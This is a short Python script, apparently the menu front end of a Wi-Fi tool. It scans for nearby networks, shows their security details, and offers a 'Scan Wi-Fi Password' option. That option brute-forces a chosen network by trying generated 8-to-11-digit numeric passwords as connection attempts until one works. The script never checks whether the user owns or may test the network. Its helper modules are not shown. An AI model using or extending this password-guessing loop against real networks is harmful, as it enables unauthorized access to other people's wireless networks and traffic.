from wifi import wifi
from brute_force import brute_force

def get_choice_feature():
    """
    Display menu options and get user input for Wi-Fi operations.

    Returns:
        int: User's choice (1, 2, 3 or 4)
    """
    # while True:
    print("\nFeatures:")
    print("1. Scan Wi-Fi Networks")
    print("2. Security Information")
    print("3. Scan Wi-Fi Password")
    print("Press 4 to Exit")
    print("-" * 25)

    try:
        choice = int(input("Enter your choice (1-4): "))
        if choice in [1, 2, 3, 4]:
            return choice
        else:
            print("Invalid choice. Please enter 1, 2, 3, or 4.")
    except ValueError:
        print("Invalid input. Please enter a number (1, 2, 3, or 4).")

if __name__ == "__main__":
    wifi = wifi()
    algo = brute_force()

    while True:
        # Get feature choice in each iteration
        choice = get_choice_feature()

        if choice == 1:
            # Scan Wi-Fi Networks
            print("\nScanning for Wi-Fi networks...")
            ssids = wifi.scan_wifi_ssids()
            if ssids:
                print("Available Wi-Fi SSIDs:")
                for ssid in ssids:
                    print(f"- {ssid}")
            else:
                print("No Wi-Fi networks found.")

        elif choice == 2:
            # Security Information
            ssid = input("Enter SSID to check security information: ")
            print(f"\nGetting security information for '{ssid}'...")
            security_info = wifi.get_wifi_security(ssid)
            print(security_info)

        elif choice == 3:
            # Scan Wi-Fi Password
            ssid = input("Enter SSID to scan password for: ")
            print(f"\nAttempting to find password for '{ssid}'...")
            for num_password in algo.generate_numbers(8, 11, limit=10):
                print(num_password)
                connect, message = wifi.connect_to_wifi(ssid, str(num_password))
                if connect:
                    print(f"✓ Password found: {num_password}")
                    break
                elif connect == None:
                    print(message)
                    break

        elif choice == 4:
            print("Exiting the program. Goodbye!")
            break

        else:
            break
